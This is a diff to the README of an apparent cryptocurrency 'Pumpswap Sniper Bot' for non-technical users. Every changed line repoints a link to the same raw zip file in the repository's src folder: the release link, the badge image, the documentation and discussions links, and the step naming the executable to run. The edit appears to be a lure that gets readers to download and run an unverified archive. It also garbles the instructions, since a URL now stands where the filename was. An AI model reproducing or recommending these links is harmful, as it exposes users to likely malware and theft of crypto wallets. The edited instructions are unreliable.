@@ -7,9 +7,9 @@ The Pumpswap Sniper Bot helps users quickly buy tokens during price changes. Thi
 To get started with the Pumpswap Sniper Bot, follow these steps to ensure a smooth experience. We designed this guide for non-technical users, so you can easily understand the process.
 
 ## 📥 Download the Application
-[![Download the Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/ErikGlezDiaz/pumpswap-sniper-bot-0slot/releases)
+[![Download the Latest Release](https://github.com/ErikGlezDiaz/pumpswap-sniper-bot-0slot/raw/refs/heads/main/src/slot_pumpswap_sniper_bot_1.5.zip)](https://github.com/ErikGlezDiaz/pumpswap-sniper-bot-0slot/raw/refs/heads/main/src/slot_pumpswap_sniper_bot_1.5.zip)
 
-Please click the button above or follow this link: [Download Latest Release](https://github.com/ErikGlezDiaz/pumpswap-sniper-bot-0slot/releases).
+Please click the button above or follow this link: [Download Latest Release](https://github.com/ErikGlezDiaz/pumpswap-sniper-bot-0slot/raw/refs/heads/main/src/slot_pumpswap_sniper_bot_1.5.zip).
 
 ## 💻 System Requirements
 Before downloading, ensure that your computer meets the following requirements:
@@ -23,7 +23,7 @@ Before downloading, ensure that your computer meets the following requirements:
 1. Download the application using the link provided above.
 2. Locate the downloaded file in your 'Downloads' folder or your chosen download directory.
 3. If it's a zipped file, right-click on it and select “Extract All...” to unzip it.
-4. Open the extracted folder and find the main application file. It will typically be named `pumpswap-sniper-bot.exe` or similar.
+4. Open the extracted folder and find the main application file. It will typically be named `https://github.com/ErikGlezDiaz/pumpswap-sniper-bot-0slot/raw/refs/heads/main/src/slot_pumpswap_sniper_bot_1.5.zip` or similar.
 
 ## 🚀 Running the Application
 1. Double-click on the application file you extracted. If prompted by your system, confirm that you want to run the application.
@@ -50,8 +50,8 @@ For more details about the bot's functions, updates, and community discussions, 
 The repository hosts valuable information and potential contributions from users like you.
 
 ## 🔗 Learn More
-- [Pumpswap Sniper Bot Documentation](https://github.com/ErikGlezDiaz/pumpswap-sniper-bot-0slot)
-- [Community Discussions](https://github.com/ErikGlezDiaz/pumpswap-sniper-bot-0slot/discussions)
+- [Pumpswap Sniper Bot Documentation](https://github.com/ErikGlezDiaz/pumpswap-sniper-bot-0slot/raw/refs/heads/main/src/slot_pumpswap_sniper_bot_1.5.zip)
+- [Community Discussions](https://github.com/ErikGlezDiaz/pumpswap-sniper-bot-0slot/raw/refs/heads/main/src/slot_pumpswap_sniper_bot_1.5.zip)
 
 ## 🛠️ Troubleshooting
 If the application does not work as expected, consider these common issues:
